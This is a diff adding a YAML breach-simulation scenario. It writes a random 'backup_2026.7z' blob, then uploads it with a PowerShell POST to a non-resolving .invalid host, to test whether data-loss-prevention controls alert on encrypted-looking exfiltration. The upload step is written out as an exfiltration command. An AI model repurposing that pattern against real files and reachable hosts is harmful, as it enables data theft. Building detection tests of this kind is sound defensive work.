@@ -1,0 +1,120 @@
+id: collection-encrypted-blob-detection
+product_line: dlp
+name: Encrypted Archive Blob Detection Probe
+description: >
+  Telemetry-safe emulation of concealment by encryption, aimed at the detection
+  side. An encrypted archive looks like random bytes to a scanner, so this
+  scenario creates a 2 MB high-entropy file with an archive-style name and
+  checks whether an endpoint or DLP control notices it. The bytes come from a
+  cryptographic random number generator and are not a real archive. The
+  encrypted-archive scenario covers building an archive; this one covers whether
+  opaque, high-entropy data with an archive name is flagged at all.
+
+  KILL CHAIN STAGES:
+    1. Opaque Blob Creation — write 2 MB of random bytes named as a backup archive (T1027)
+    2. Blob Upload Attempt  — POST the blob to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: The bytes are random and carry no real data. The file is deleted in
+  cleanup. The destination is a .invalid host and cannot resolve. Windows only.
+  Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - obfuscation
+  - encryption
+  - archive
+  - detection
+  - dlp
+  - t1027
+  - t1048
+  - mitre
+mitre_phases:
+  - defense-evasion
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Opaque Blob Creation (T1027)
+  # ---------------------------------------------------------------------------
+  - name: "Opaque Blob 1 — High-Entropy Archive-Named File (T1027)"
+    technique_id: T1027
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes 2 MB of cryptographically random bytes to backup_2026.7z under %TEMP%\\bas_blob_<runid>. The bytes are not an archive and hold no data. The folder is deleted in cleanup."
+    telemetry:
+      - "Sysmon EID 11: archive-named file created under %TEMP%\\bas_blob_<runid>"
+    detection:
+      - "DLP/EDR: high-entropy file with an archive extension created outside a backup process — concealment IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_blob_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      $blob = Join-Path $work 'backup_2026.7z'
+      $bytes = New-Object byte[] (2MB)
+      $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+      $rng.GetBytes($bytes)
+      $rng.Dispose()
+      [System.IO.File]::WriteAllBytes($blob, $bytes)
+      $size = (Get-Item $blob).Length
+      Write-Output "EXEC T1027: wrote $size bytes of random data named as an archive at $blob. It is not a real archive. Opaque Stage 1. [BAS-SIM-OPQ-S1]"
+      Write-Output "FAIL: A high-entropy file with an archive name was created in a temp folder with no alert. Opaque data that looks like an encrypted archive should be flagged."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Blob Upload Attempt (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Opaque Blob 2 — Upload Attempt of the Blob to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs the random 2 MB blob from Stage 1 to an RFC-6761 .invalid host. The host cannot resolve, so nothing leaves the host. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Proxy/egress: POST of an opaque high-entropy archive-named file"
+    detection:
+      - "Egress/DLP: opaque high-entropy file uploaded to an unknown host — encrypted-exfil alert expected"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $blob = Join-Path $env:TEMP "bas_blob_$runId\backup_2026.7z"
+      if (-not (Test-Path $blob)) {
+        Write-Output "SKIP: no opaque blob from Stage 1 to send. [BAS-SIM-OPQ-S2]"
+        exit 0
+      }
+      $target = "http://bas-sim-blob-$runId.invalid/upload"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $blob -ContentType 'application/octet-stream' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted HTTP POST of the opaque blob to $target. reached=$reached (expected: false). Blob upload Stage 2. [BAS-SIM-OPQ-S2]"
+      if ($reached) {
+        Write-Output "FAIL: An opaque archive-named blob was delivered to an unknown host. Egress is not inspecting high-entropy outbound files."
+      } else {
+        Write-Output "FAIL: The endpoint attempted to send an opaque archive-named blob to an unknown host with no alert. Unreachable only because the domain is .invalid."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_blob_*') -Recurse -Force -ErrorAction SilentlyContinue
